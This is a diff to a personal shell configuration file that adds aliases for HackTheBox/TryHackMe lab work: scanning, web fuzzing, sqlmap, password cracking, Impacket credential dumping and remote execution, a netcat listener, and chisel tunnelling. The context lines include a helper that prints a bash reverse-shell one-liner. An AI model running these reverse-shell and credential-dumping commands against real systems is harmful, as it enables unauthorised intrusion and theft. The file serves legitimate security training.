@@ -73,6 +73,65 @@ alias pacclean='sudo pacman -Sc'          # Clean cache
 # ============================================
 # Security & Hacking (ethical only)
 # ============================================
+
+# --- Variables ---
+export WORDLISTS="/usr/share/seclists"
+export TARGET=""
+export LHOST=""
+export LPORT="4444"
+
+# --- Target management ---
+settarget() { export TARGET="$1"; echo "[*] Target → $TARGET"; }
+setlhost()  { export LHOST="$1";  echo "[*] LHOST  → $LHOST";  }
+myhtbip()   {
+    ip -br addr show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1 \
+        || echo "[!] tun0 no activo"
+}
+
+# --- VPN labs (HTB/THM) — distinto a ProtonVPN ---
+alias htbvpn='sudo openvpn --config ~/vpn/htb.ovpn --daemon'
+alias thmvpn='sudo openvpn --config ~/vpn/thm.ovpn --daemon'
+alias vpnkill='sudo pkill openvpn'
+alias tun0='ip -br addr show tun0 2>/dev/null | awk "{print \$3}" | cut -d/ -f1'
+
+# --- Reconocimiento ---
+alias nmapq='nmap -sV -sC -oN scan.txt'
+alias nmapf='nmap -p- -T4 -oN fullscan.txt'
+alias nmapU='nmap -sU --top-ports 200 -oN udp.txt'
+
+# --- Web enumeration ---
+alias fuzz='ffuf -w $WORDLISTS/Discovery/Web-Content/common.txt -u'
+alias fuzzdir='ffuf -w $WORDLISTS/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
+alias ferox='feroxbuster --url'
+alias nikscan='nikto -h'
+alias sqli='sqlmap -u'
+
+# --- Cracking ---
+alias jtr='john --wordlist=$WORDLISTS/Passwords/Leaked-Databases/rockyou.txt'
+alias hcat='hashcat -a 0 -w 3'
+
+# --- SMB / AD ---
+alias smb='smbclient'
+alias smblist='smbclient -L'
+alias enum4='enum4linux -a'
+
+# --- Impacket ---
+alias secretsdump='impacket-secretsdump'
+alias psexec='impacket-psexec'
+alias wmiexec='impacket-wmiexec'
+alias smbexec='impacket-smbexec'
+alias evilwinrm='evil-winrm -i'
+
+# --- Listeners / Tunneling ---
+alias ncl='nc -lvnp $LPORT'
+alias chiselserver='chisel server -p 8888 --reverse'
+alias chiselclient='chisel client'
+alias proxy='proxychains -q'
+
+# --- Misc ---
+alias vol='volatility3'
+alias binwalk='binwalk -e'
+
 revshell() {
     local ip="${1:-127.0.0.1}" port="${2:-4444}"
     echo "Bash:   bash -i >& /dev/tcp/$ip/$port 0>&1"
